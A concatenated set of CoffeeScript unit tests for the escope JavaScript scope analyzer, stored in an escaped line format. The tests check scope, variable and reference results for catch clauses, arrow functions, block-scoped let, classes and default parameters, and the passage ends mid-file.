modification<c> are permitted provided that the following conditions are met:<\n>-#<\n>-#    * Redistributions of source code must retain the above copyright<\n>-#      notice<c> this list of conditions and the following disclaimer.<\n>-#    * Redistributions in binary form must reproduce the above copyright<\n>-#      notice<c> this list of conditions and the following disclaimer in the<\n>-#      documentation and/or other materials provided with the distribution.<\n>-#<\n>-#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>-#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>-#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>-#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>-#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>-#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>-#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>-#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>-#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>-#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>-expect = require('chai').expect<\n>-esprima = require 'esprima'<\n>-harmony = require '../third_party/esprima'<\n>-escope = require '..'<\n>-describe 'catch'<c> -><\n>-    it 'creates scope'<c> -><\n>-        ast = esprima.parse """"""<\n>-        (function () {<\n>-            try {<\n>-            } catch (e) {<\n>-            }<\n>-        }());<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<\n>-        expect(scopeManager.scopes).to.have.length 3<\n>-        globalScope = scopeManager.scopes[0]<\n>-        expect(globalScope.type).to.be.equal 'global'<\n>-        expect(globalScope.variables).to.have.length 0<\n>-        expect(globalScope.references).to.have.length 0<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.be.equal 'function'<\n>-        expect(scope.variables).to.have.length 1<\n>-        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>-        expect(scope.isArgumentsMaterialized()).to.be.false<\n>-        expect(scope.references).to.have.length 0<\n>-        scope = scopeManager.scopes[2]<\n>-        expect(scope.type).to.be.equal 'catch'<\n>-        expect(scope.variables).to.have.length 1<\n>-        expect(scope.variables[0].name).to.be.equal 'e'<\n>-        expect(scope.isArgumentsMaterialized()).to.be.true<\n>-        expect(scope.references).to.have.length 0<\n>-# vim: set sw=4 ts=4 et tw=80 :<\n>-# -*- coding: utf-8 -*-<\n>-#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>-#<\n>-#  Redistribution and use in source and binary forms<c> with or without<\n>-#  modification<c> are permitted provided that the following conditions are met:<\n>-#<\n>-#    * Redistributions of source code must retain the above copyright<\n>-#      notice<c> this list of conditions and the following disclaimer.<\n>-#    * Redistributions in binary form must reproduce the above copyright<\n>-#      notice<c> this list of conditions and the following disclaimer in the<\n>-#      documentation and/or other materials provided with the distribution.<\n>-#<\n>-#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>-#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>-#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>-#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>-#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>-#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>-#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>-#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>-#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>-#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>-expect = require('chai').expect<\n>-harmony = require '../third_party/esprima'<\n>-escope = require '..'<\n>-describe 'ES6 arrow function expression'<c> -><\n>-    it 'materialize scope for arrow function expression'<c> -><\n>-        ast = harmony.parse """"""<\n>-        var arrow = () => {<\n>-            let i = 0;<\n>-            var j = 20;<\n>-            console.log(i);<\n>-        }<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 2<\n>-        scope = scopeManager.scopes[0]<\n>-        expect(scope.type).to.be.equal 'global'<\n>-        expect(scope.block.type).to.be.equal 'Program'<\n>-        expect(scope.isStrict).to.be.false<\n>-        expect(scope.variables).to.have.length 1<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.be.equal 'function'<\n>-        expect(scope.block.type).to.be.equal 'ArrowFunctionExpression'<\n>-        expect(scope.isStrict).to.be.true<\n>-        expect(scope.variables).to.have.length 2<\n>-        # There's no ""arguments""<\n>-        expect(scope.variables[0].name).to.be.equal 'i'<\n>-        expect(scope.variables[1].name).to.be.equal 'j'<\n>-    it 'generate bindings for parameters'<c> -><\n>-        ast = harmony.parse """"""<\n>-        var arrow = (a<c> b<c> c<c> d) => {<\n>-        }<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 2<\n>-        scope = scopeManager.scopes[0]<\n>-        expect(scope.type).to.be.equal 'global'<\n>-        expect(scope.block.type).to.be.equal 'Program'<\n>-        expect(scope.isStrict).to.be.false<\n>-        expect(scope.variables).to.have.length 1<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.be.equal 'function'<\n>-        expect(scope.block.type).to.be.equal 'ArrowFunctionExpression'<\n>-        expect(scope.isStrict).to.be.true<\n>-        expect(scope.variables).to.have.length 4<\n>-        # There's no ""arguments""<\n>-        expect(scope.variables[0].name).to.be.equal 'a'<\n>-        expect(scope.variables[1].name).to.be.equal 'b'<\n>-        expect(scope.variables[2].name).to.be.equal 'c'<\n>-        expect(scope.variables[3].name).to.be.equal 'd'<\n>-# vim: set sw=4 ts=4 et tw=80 :<\n>-# -*- coding: utf-8 -*-<\n>-#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>-#<\n>-#  Redistribution and use in source and binary forms<c> with or without<\n>-#  modification<c> are permitted provided that the following conditions are met:<\n>-#<\n>-#    * Redistributions of source code must retain the above copyright<\n>-#      notice<c> this list of conditions and the following disclaimer.<\n>-#    * Redistributions in binary form must reproduce the above copyright<\n>-#      notice<c> this list of conditions and the following disclaimer in the<\n>-#      documentation and/or other materials provided with the distribution.<\n>-#<\n>-#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>-#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>-#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>-#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>-#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>-#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>-#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>-#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>-#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>-#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>-expect = require('chai').expect<\n>-harmony = require '../third_party/esprima'<\n>-escope = require '..'<\n>-describe 'ES6 block scope'<c> -><\n>-    it 'let is materialized in ES6 block scope#1'<c> -><\n>-        ast = harmony.parse """"""<\n>-        {<\n>-            let i = 20;<\n>-            i;<\n>-        }<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 2  # Program and BlcokStatement scope.<\n>-        scope = scopeManager.scopes[0]<\n>-        expect(scope.type).to.be.equal 'global'<\n>-        expect(scope.variables).to.have.length 0  # No variable in Program scope.<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.be.equal 'block'<\n>-        expect(scope.variables).to.have.length 1  # `i` in block scope.<\n>-        expect(scope.variables[0].name).to.be.equal 'i'<\n>-        expect(scope.references).to.have.length 2<\n>-        expect(scope.references[0].identifier.name).to.be.equal('i')<\n>-        expect(scope.references[1].identifier.name).to.be.equal('i')<\n>-    it 'let is materialized in ES6 block scope#2'<c> -><\n>-        ast = harmony.parse """"""<\n>-        {<\n>-            let i = 20;<\n>-            var i = 20;<\n>-            i;<\n>-        }<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 2  # Program and BlcokStatement scope.<\n>-        scope = scopeManager.scopes[0]<\n>-        expect(scope.type).to.be.equal 'global'<\n>-        expect(scope.variables).to.have.length 1  # No variable in Program scope.<\n>-        expect(scope.variables[0].name).to.be.equal 'i'<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.be.equal 'block'<\n>-        expect(scope.variables).to.have.length 1  # `i` in block scope.<\n>-        expect(scope.variables[0].name).to.be.equal 'i'<\n>-        expect(scope.references).to.have.length 3<\n>-        expect(scope.references[0].identifier.name).to.be.equal('i')<\n>-        expect(scope.references[1].identifier.name).to.be.equal('i')<\n>-        expect(scope.references[2].identifier.name).to.be.equal('i')<\n>-    it 'function delaration is materialized in ES6 block scope'<c> -><\n>-        ast = harmony.parse """"""<\n>-        {<\n>-            function test() {<\n>-            }<\n>-            test();<\n>-        }<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 3<\n>-        scope = scopeManager.scopes[0]<\n>-        expect(scope.type).to.be.equal 'global'<\n>-        expect(scope.variables).to.have.length 0<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.be.equal 'block'<\n>-        expect(scope.variables).to.have.length 1<\n>-        expect(scope.variables[0].name).to.be.equal 'test'<\n>-        expect(scope.references).to.have.length 1<\n>-        expect(scope.references[0].identifier.name).to.be.equal('test')<\n>-        scope = scopeManager.scopes[2]<\n>-        expect(scope.type).to.be.equal 'function'<\n>-        expect(scope.variables).to.have.length 1<\n>-        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>-        expect(scope.references).to.have.length 0<\n>-    it 'let is not hoistable#1'<c> -><\n>-        ast = harmony.parse """"""<\n>-        var i = 42; (1)<\n>-        {<\n>-            i;  // (2) ReferenceError at runtime.<\n>-            let i = 20;  // (2)<\n>-            i;  // (2)<\n>-        }<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 2<\n>-        globalScope = scopeManager.scopes[0]<\n>-        expect(globalScope.type).to.be.equal 'global'<\n>-        expect(globalScope.variables).to.have.length 1<\n>-        expect(globalScope.variables[0].name).to.be.equal 'i'<\n>-        expect(globalScope.references).to.have.length 1<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.be.equal 'block'<\n>-        expect(scope.variables).to.have.length 1<\n>-        expect(scope.variables[0].name).to.be.equal 'i'<\n>-        expect(scope.references).to.have.length 3<\n>-        expect(scope.references[0].resolved).to.be.equal scope.variables[0]<\n>-        expect(scope.references[1].resolved).to.be.equal scope.variables[0]<\n>-        expect(scope.references[2].resolved).to.be.equal scope.variables[0]<\n>-    it 'let is not hoistable#2'<c> -><\n>-        ast = harmony.parse """"""<\n>-        (function () {<\n>-            var i = 42; // (1)<\n>-            i;  // (1)<\n>-            {<\n>-                i;  // (3)<\n>-                {<\n>-                    i;  // (2)<\n>-                    let i = 20;  // (2)<\n>-                    i;  // (2)<\n>-                }<\n>-                let i = 30;  // (3)<\n>-                i;  // (3)<\n>-            }<\n>-            i;  // (1)<\n>-        }());<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 4<\n>-        globalScope = scopeManager.scopes[0]<\n>-        expect(globalScope.type).to.be.equal 'global'<\n>-        expect(globalScope.variables).to.have.length 0<\n>-        expect(globalScope.references).to.have.length 0<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.be.equal 'function'<\n>-        expect(scope.variables).to.have.length 2<\n>-        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>-        expect(scope.variables[1].name).to.be.equal 'i'<\n>-        v1 = scope.variables[1]<\n>-        expect(scope.references).to.have.length 3<\n>-        expect(scope.references[0].resolved).to.be.equal v1<\n>-        expect(scope.references[1].resolved).to.be.equal v1<\n>-        expect(scope.references[2].resolved).to.be.equal v1<\n>-        scope = scopeManager.scopes[2]<\n>-        expect(scope.type).to.be.equal 'block'<\n>-        expect(scope.variables).to.have.length 1<\n>-        expect(scope.variables[0].name).to.be.equal 'i'<\n>-        v3 = scope.variables[0]<\n>-        expect(scope.references).to.have.length 3<\n>-        expect(scope.references[0].resolved).to.be.equal v3<\n>-        expect(scope.references[1].resolved).to.be.equal v3<\n>-        expect(scope.references[2].resolved).to.be.equal v3<\n>-        scope = scopeManager.scopes[3]<\n>-        expect(scope.type).to.be.equal 'block'<\n>-        expect(scope.variables).to.have.length 1<\n>-        expect(scope.variables[0].name).to.be.equal 'i'<\n>-        v2 = scope.variables[0]<\n>-        expect(scope.references).to.have.length 3<\n>-        expect(scope.references[0].resolved).to.be.equal v2<\n>-        expect(scope.references[1].resolved).to.be.equal v2<\n>-        expect(scope.references[2].resolved).to.be.equal v2<\n>-# vim: set sw=4 ts=4 et tw=80 :<\n>-# -*- coding: utf-8 -*-<\n>-#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>-#<\n>-#  Redistribution and use in source and binary forms<c> with or without<\n>-#  modification<c> are permitted provided that the following conditions are met:<\n>-#<\n>-#    * Redistributions of source code must retain the above copyright<\n>-#      notice<c> this list of conditions and the following disclaimer.<\n>-#    * Redistributions in binary form must reproduce the above copyright<\n>-#      notice<c> this list of conditions and the following disclaimer in the<\n>-#      documentation and/or other materials provided with the distribution.<\n>-#<\n>-#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>-#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>-#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>-#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>-#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>-#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>-#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>-#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>-#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>-#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>-expect = require('chai').expect<\n>-harmony = require '../third_party/esprima'<\n>-espree = require '../third_party/espree'<\n>-escope = require '..'<\n>-describe 'ES6 catch'<c> -><\n>-    it 'takes binding pattern'<c> -><\n>-        ast = harmony.parse """"""<\n>-        try {<\n>-        } catch ({ a<c> b<c> c<c> d }) {<\n>-            let e = 20;<\n>-            a;<\n>-            b;<\n>-            let c = 30;<\n>-            c;<\n>-            d;<\n>-        }<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 4<\n>-        scope = scopeManager.scopes[0]<\n>-        expect(scope.type).to.be.equal 'global'<\n>-        expect(scope.block.type).to.be.equal 'Program'<\n>-        expect(scope.isStrict).to.be.false<\n>-        expect(scope.variables).to.have.length 0<\n>-        expect(scope.references).to.have.length 0<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.be.equal 'block'<\n>-        expect(scope.block.type).to.be.equal 'BlockStatement'<\n>-        expect(scope.isStrict).to.be.false<\n>-        expect(scope.variables).to.have.length 0<\n>-        expect(scope.references).to.have.length 0<\n>-        scope = scopeManager.scopes[2]<\n>-        expect(scope.type).to.be.equal 'catch'<\n>-        expect(scope.block.type).to.be.equal 'CatchClause'<\n>-        expect(scope.isStrict).to.be.false<\n>-        # FIXME After Esprima's bug is fixed<c> I'll add tests #33<\n>-        # https://github.com/estools/escope/issues/33#issuecomment-64135832<\n>-        #<\n>-        # expect(scope.variables).to.have.length 4<\n>-        # expect(scope.variables[0].name).to.be.equal 'a'<\n>-        # expect(scope.variables[1].name).to.be.equal 'b'<\n>-        # expect(scope.variables[2].name).to.be.equal 'c'<\n>-        # expect(scope.variables[3].name).to.be.equal 'd'<\n>-        # expect(scope.references).to.have.length 0<\n>-        scope = scopeManager.scopes[3]<\n>-        expect(scope.type).to.be.equal 'block'<\n>-        expect(scope.block.type).to.be.equal 'BlockStatement'<\n>-        expect(scope.isStrict).to.be.false<\n>-        expect(scope.variables).to.have.length 2<\n>-        expect(scope.variables.map((variable) -> variable.name)).to.be.eql([<\n>-            'e'<\n>-            'c'<\n>-        ])<\n>-        expect(scope.references.map((ref) -> ref.identifier.name)).to.be.eql([<\n>-            'e'<\n>-            'a'<\n>-            'b'<\n>-            'c'<\n>-            'c'<\n>-            'd'<\n>-        ])<\n>-# vim: set sw=4 ts=4 et tw=80 :<\n>-# -*- coding: utf-8 -*-<\n>-#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>-#<\n>-#  Redistribution and use in source and binary forms<c> with or without<\n>-#  modification<c> are permitted provided that the following conditions are met:<\n>-#<\n>-#    * Redistributions of source code must retain the above copyright<\n>-#      notice<c> this list of conditions and the following disclaimer.<\n>-#    * Redistributions in binary form must reproduce the above copyright<\n>-#      notice<c> this list of conditions and the following disclaimer in the<\n>-#      documentation and/or other materials provided with the distribution.<\n>-#<\n>-#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>-#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>-#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>-#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>-#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>-#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>-#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>-#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>-#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>-#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>-expect = require('chai').expect<\n>-harmony = require '../third_party/esprima'<\n>-escope = require '..'<\n>-describe 'ES6 class'<c> -><\n>-    it 'declaration name creates class scope'<c> -><\n>-        ast = harmony.parse """"""<\n>-        class Derived extends Base {<\n>-            constructor() {<\n>-            }<\n>-        }<\n>-        new Derived();<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 3<\n>-        scope = scopeManager.scopes[0]<\n>-        expect(scope.type).to.be.equal 'global'<\n>-        expect(scope.block.type).to.be.equal 'Program'<\n>-        expect(scope.isStrict).to.be.false<\n>-        expect(scope.variables).to.have.length 1<\n>-        expect(scope.variables[0].name).to.be.equal 'Derived'<\n>-        expect(scope.references).to.have.length 2<\n>-        expect(scope.references[0].identifier.name).to.be.equal 'Base'<\n>-        expect(scope.references[1].identifier.name).to.be.equal 'Derived'<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.be.equal 'class'<\n>-        expect(scope.block.type).to.be.equal 'ClassDeclaration'<\n>-        expect(scope.isStrict).to.be.true<\n>-        expect(scope.variables).to.have.length 1<\n>-        expect(scope.variables[0].name).to.be.equal 'Derived'<\n>-        expect(scope.references).to.have.length 0<\n>-        scope = scopeManager.scopes[2]<\n>-        expect(scope.type).to.be.equal 'function'<\n>-        expect(scope.block.type).to.be.equal 'FunctionExpression'<\n>-        expect(scope.isStrict).to.be.true<\n>-        expect(scope.variables).to.have.length 1<\n>-        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>-        expect(scope.references).to.have.length 0<\n>-    it 'expression name creates class scope#1'<c> -><\n>-        ast = harmony.parse """"""<\n>-        (class Derived extends Base {<\n>-            constructor() {<\n>-            }<\n>-        });<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 3<\n>-        scope = scopeManager.scopes[0]<\n>-        expect(scope.type).to.be.equal 'global'<\n>-        expect(scope.block.type).to.be.equal 'Program'<\n>-        expect(scope.isStrict).to.be.false<\n>-        expect(scope.variables).to.have.length 0<\n>-        expect(scope.references).to.have.length 1<\n>-        expect(scope.references[0].identifier.name).to.be.equal 'Base'<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.be.equal 'class'<\n>-        expect(scope.block.type).to.be.equal 'ClassExpression'<\n>-        expect(scope.isStrict).to.be.true<\n>-        expect(scope.variables).to.have.length 1<\n>-        expect(scope.variables[0].name).to.be.equal 'Derived'<\n>-        expect(scope.references).to.have.length 0<\n>-        scope = scopeManager.scopes[2]<\n>-        expect(scope.type).to.be.equal 'function'<\n>-        expect(scope.block.type).to.be.equal 'FunctionExpression'<\n>-    it 'expression name creates class scope#2'<c> -><\n>-        ast = harmony.parse """"""<\n>-        (class extends Base {<\n>-            constructor() {<\n>-            }<\n>-        });<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 3<\n>-        scope = scopeManager.scopes[0]<\n>-        expect(scope.type).to.be.equal 'global'<\n>-        expect(scope.block.type).to.be.equal 'Program'<\n>-        expect(scope.isStrict).to.be.false<\n>-        expect(scope.variables).to.have.length 0<\n>-        expect(scope.references).to.have.length 1<\n>-        expect(scope.references[0].identifier.name).to.be.equal 'Base'<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.be.equal 'class'<\n>-        expect(scope.block.type).to.be.equal 'ClassExpression'<\n>-        scope = scopeManager.scopes[2]<\n>-        expect(scope.type).to.be.equal 'function'<\n>-        expect(scope.block.type).to.be.equal 'FunctionExpression'<\n>-    it 'computed property key may refer variables'<c> -><\n>-        ast = harmony.parse """"""<\n>-        (function () {<\n>-            var yuyushiki = 42;<\n>-            (class {<\n>-                [yuyushiki]() {<\n>-                }<\n>-                [yuyushiki + 40]() {<\n>-                }<\n>-            });<\n>-        }());<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 5<\n>-        scope = scopeManager.scopes[0]<\n>-        expect(scope.type).to.be.equal 'global'<\n>-        expect(scope.block.type).to.be.equal 'Program'<\n>-        expect(scope.isStrict).to.be.false<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.be.equal 'function'<\n>-        expect(scope.block.type).to.be.equal 'FunctionExpression'<\n>-        expect(scope.isStrict).to.be.false<\n>-        expect(scope.variables).to.have.length 2<\n>-        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>-        expect(scope.variables[1].name).to.be.equal 'yuyushiki'<\n>-        expect(scope.references).to.have.length 1<\n>-        expect(scope.references[0].identifier.name).to.be.equal 'yuyushiki'<\n>-        scope = scopeManager.scopes[2]<\n>-        expect(scope.type).to.be.equal 'class'<\n>-        expect(scope.block.type).to.be.equal 'ClassExpression'<\n>-        expect(scope.isStrict).to.be.true<\n>-        expect(scope.variables).to.have.length 0<\n>-        expect(scope.references).to.have.length 2<\n>-        expect(scope.references[0].identifier.name).to.be.equal 'yuyushiki'<\n>-        expect(scope.references[1].identifier.name).to.be.equal 'yuyushiki'<\n>-    it 'regression #49'<c> -><\n>-        ast = harmony.parse """"""<\n>-        class Shoe {<\n>-            constructor() {<\n>-                //Shoe.x = true;<\n>-            }<\n>-        }<\n>-        let shoe = new Shoe();<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 3<\n>-        scope = scopeManager.scopes[0]<\n>-        expect(scope.type).to.be.equal 'global'<\n>-        expect(scope.block.type).to.be.equal 'Program'<\n>-        expect(scope.isStrict).to.be.false<\n>-        expect(scope.variables).to.have.length 2<\n>-        expect(scope.variables[0].name).to.be.equal 'Shoe'<\n>-        expect(scope.variables[1].name).to.be.equal 'shoe'<\n>-        expect(scope.references).to.have.length 2<\n>-        expect(scope.references[0].identifier.name).to.be.equal 'shoe'<\n>-        expect(scope.references[1].identifier.name).to.be.equal 'Shoe'<\n>-# vim: set sw=4 ts=4 et tw=80 :<\n>-# -*- coding: utf-8 -*-<\n>-#  Copyright (C) 2015 Toru Nagashima<\n>-#<\n>-#  Redistribution and use in source and binary forms<c> with or without<\n>-#  modification<c> are permitted provided that the following conditions are met:<\n>-#<\n>-#    * Redistributions of source code must retain the above copyright<\n>-#      notice<c> this list of conditions and the following disclaimer.<\n>-#    * Redistributions in binary form must reproduce the above copyright<\n>-#      notice<c> this list of conditions and the following disclaimer in the<\n>-#      documentation and/or other materials provided with the distribution.<\n>-#<\n>-#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>-#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>-#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>-#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>-#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>-#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>-#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>-#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>-#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>-#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>-expect = require('chai').expect<\n>-espree = require '../third_party/espree'<\n>-escope = require '..'<\n>-describe 'ES6 default parameters:'<c> -><\n>-    describe 'a default parameter creates a writable reference for its initialization:'<c> -><\n>-        patterns =<\n>-            FunctionDeclaration: """"""<\n>-                function foo(a<c> b = 0) {}<\n>-            """"""<\n>-            FunctionExpression: """"""<\n>-                let foo = function(a<c> b = 0) {};<\n>-            """"""<\n>-            ArrowExpression: """"""<\n>-                let foo = (a<c> b = 0) => {};<\n>-            """"""<\n>-        for name<c> code of patterns then do (name<c> code) -><\n>-            it name<c> -><\n>-                numVars = if name == 'ArrowExpression' then 2 else 3<\n>-                ast = espree code<\n>-                scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-                expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>-                scope = scopeManager.scopes[1]<\n>-                expect(scope.variables).to.have.length numVars  # [arguments?<c> a<c> b]<\n>-                expect(scope.references).to.have.length 1<\n>-                reference = scope.references[0]<\n>-                expect(reference.from).to.equal scope<\n>-                expect(reference.identifier.name).to.equal 'b'<\n>-                expect(reference.resolved).to.equal scope.variables[numVars - 1]<\n>-                expect(reference.writeExpr).to.not.be.undefined<\n>-                expect(reference.isWrite()).to.be.true<\n>-                expect(reference.isRead()).to.be.false<\n>-    describe 'a default parameter creates a readable reference for references in right:'<c> -><\n>-        patterns =<\n>-            